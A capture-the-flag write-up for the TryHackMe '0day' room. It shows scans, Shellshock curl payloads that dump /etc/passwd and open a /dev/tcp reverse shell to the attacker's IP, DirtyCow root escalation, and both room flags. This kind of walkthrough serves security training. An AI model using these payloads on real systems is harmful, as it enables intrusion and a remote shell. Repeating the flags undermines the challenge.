# 0day

Exploit Ubuntu, like a Turtle in a Hurricane

[0day](https://tryhackme.com/room/0day)

## Topic's

- Network Enumeration
- Web Enumeration
- CVE-2014-6271 - shellshock
- DirtyCow

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Flags

Root my secure Website, take a step into the history of hacking.

```
kali@kali:~/CTFs/tryhackme/0day$ sudo nmap -A -sS -sC -sV -O 10.10.197.232
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-25 10:35 CET
Nmap scan report for 10.10.197.232
Host is up (0.033s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)
|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
|_  256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: 0day
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/25%OT=22%CT=1%CU=30997%PV=Y%DS=2%DC=T%G=Y%TM=5F9547
OS:08%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=105%TI=Z%CI=I%II=I%TS=8)OP
OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
OS:11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC
OS:N(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   32.03 ms 10.8.0.1
2   32.42 ms 10.10.197.232

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.27 seconds
```

```
kali@kali:~/CTFs/tryhackme/0day$ nikto --url 10.10.197.232
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.197.232
+ Target Hostname:    10.10.197.232
+ Target Port:        80
+ Start Time:         2020-10-25 10:38:36 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Server may leak inodes via ETags, header found with file /, inode: bd1, size: 5ae57bb9a1192, mtime: gzip
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ Uncommon header '93e4r0-cve-2014-6278' found, with contents: true
+ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3092: /backup/: This might be interesting...
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
+ OSVDB-3092: /secret/: This might be interesting...
+ OSVDB-3092: /cgi-bin/test.cgi: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ /admin/index.html: Admin login page/section found.
+ 8699 requests: 0 error(s) and 18 item(s) reported on remote host
+ End Time:           2020-10-25 10:44:25 (GMT1) (349 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```
OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
```

`http://10.10.197.232/cgi-bin/test.cgi`

```
curl -A "() { :;}; echo Content-Type: text/html; echo; /bin/cat /etc/passwd;" http://10.10.197.232/cgi-bin/test.cgi
```

```
kali@kali:~/CTFs/tryhackme/0day$ curl -A "() { :;}; echo Content-Type: text/html; echo; /bin/cat /etc/passwd;" http://10.10.197.232/cgi-bin/test.cgi
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
ryan:x:1000:1000:Ubuntu 14.04.1,,,:/home/ryan:/bin/bash
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
```

```
kali@kali:~/CTFs/tryhackme/0day$ curl -A "() { :;}; echo Content-Type: text/html; echo; /usr/bin/whoami;" http://10.10.197.232/cgi-bin/test.cgi
www-data
```

```
kali@kali:~/CTFs/tryhackme/0day$ curl -A "() { :;}; echo Content-Type: text/html; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/10.8.106.222/9001 0>&1';" http://10.10.197.232/cgi-bin/test.cgi
```

```
www-data@ubuntu:/usr/lib/cgi-bin$ uname -r
3.13.0-32-generic
www-data@ubuntu:/usr/lib/cgi-bin$ ls
test.cgi
www-data@ubuntu:/usr/lib/cgi-bin$ cd ~
www-data@ubuntu:/var/www$ ls
html
www-data@ubuntu:/var/www$ ls /home
ryan
www-data@ubuntu:/var/www$ ls /home/ryan/
user.txt
www-data@ubuntu:/var/www$ cat /home/ryan/user.txt
THM{Sh3llSh0ck_r0ckz}
www-data@ubuntu:/var/www$
```

```
www-data@ubuntu:/tmp$ ls
cow  socat
www-data@ubuntu:/tmp$ chmod +x cow
www-data@ubuntu:/tmp$ ./cow
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
Size of binary: 47032
Racing, this may take a while..
/usr/bin/passwd overwritten
Popping root shell.
Don't forget to restore /tmp/bak
thread stopped
thread stopped
root@ubuntu:/tmp# cat /root/root.txt
THM{g00d_j0b_0day_is_Pleased}
```

[https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)

1. user.txt

`THM{Sh3llSh0ck_r0ckz}`

2. root.txt

`THM{g00d_j0b_0day_is_Pleased}`
